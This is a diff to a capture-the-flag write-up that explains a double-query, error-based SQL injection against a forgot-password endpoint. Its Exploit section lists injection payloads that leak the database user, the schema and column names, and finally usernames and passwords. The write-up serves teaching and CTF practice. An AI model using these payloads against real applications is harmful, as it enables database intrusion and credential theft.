@@ -20,7 +20,7 @@ After finding the /api/forgot\_password endpoint, we should now find the vulnera
 
 Since everything in the website was sending POST requests from the forms to the website, this might also be a form related vulnerability. Now the most common vulnerability when it comes to taking form input in web exploitation is SQL Injection. Now the title of the challenge comes into picture where Double query attacks are a famous type of error based SQL Injection attack.
 
-Double Query attacks are commonly used when the system is not returning any data back to the website which means that ~UNION SELECT~ can't be used. Once you realise that the vulnerability is a Double Query SQL Injection, exploiting the endpoint becomes very trivial as almost all Double Query attacks are based on exploiting the integrity error messages. 
+Double Query attacks are commonly used when the system is not returning any data back to the website which means that `UNION SELECT` can't be used. Once you realise that the vulnerability is a Double Query SQL Injection, exploiting the endpoint becomes very trivial as almost all Double Query attacks are based on exploiting the integrity error messages. 
 
 ## Exploit
 
@@ -29,19 +29,19 @@ Usually forgot password forms ask for either an Email-ID or a username. So sendi
 Sending the following requests in order
 
 
-+ "sridhardked@gmail.com' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT user()), FLOOR(RAND()*2)) AS a FROM information_schema.tables GROUP BY a)x);"
++ `"sridhardked@gmail.com' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT user()), FLOOR(RAND()*2)) AS a FROM information_schema.tables GROUP BY a)x);"`
 
   Leaks the user under which the DB is running
  
-+ "sridhardked@gmail.com' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()), FLOOR(RAND()*2)) AS a FROM information_schema.tables GROUP BY a)x);"
++ `"sridhardked@gmail.com' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()), FLOOR(RAND()*2)) AS a FROM information_schema.tables GROUP BY a)x);"`
   
    Leaks the name of the DB
 
-+ "sridhardked@gmail.com' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1), FLOOR(RAND()*5)) AS a FROM information_schema.tables GROUP BY a)x)-- -"
++ `"sridhardked@gmail.com' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1), FLOOR(RAND()*5)) AS a FROM information_schema.tables GROUP BY a)x)-- -"`
  
   Leaks the First Column name in the DB
 
-+ "sridhardked@gmail.com' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1,1), FLOOR(RAND()*5)) AS a FROM information_schema.tables GROUP BY a)x)-- -"
++ `"sridhardked@gmail.com' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1,1), FLOOR(RAND()*5)) AS a FROM information_schema.tables GROUP BY a)x)-- -"`
 
   Leaks the second column name in the DB
   
@@ -49,7 +49,7 @@ Sending the following requests in order
   .
   .
   
-+ "sridhardked@gmail.com' AND SELECT * FROM users WHERE id = '1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT MID(username,1,63) FROM users LIMIT 0,1),':',(SELECT MID(password,1,63) FROM users LIMIT 0,1),':',(SELECT MID(password,1,63) FROM users LIMIT 2,1), FLOOR(RAND()*5)) AS a FROM information_schema.tables GROUP BY a)x)-- -"
++ `"sridhardked@gmail.com' AND SELECT * FROM users WHERE id = '1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT MID(username,1,63) FROM users LIMIT 0,1),':',(SELECT MID(password,1,63) FROM users LIMIT 0,1),':',(SELECT MID(password,1,63) FROM users LIMIT 2,1), FLOOR(RAND()*5)) AS a FROM information_schema.tables GROUP BY a)x)-- -"`
 
   After getting all the column names, they can be used to get the username and passwords of all the users in the table using the mechanism
   
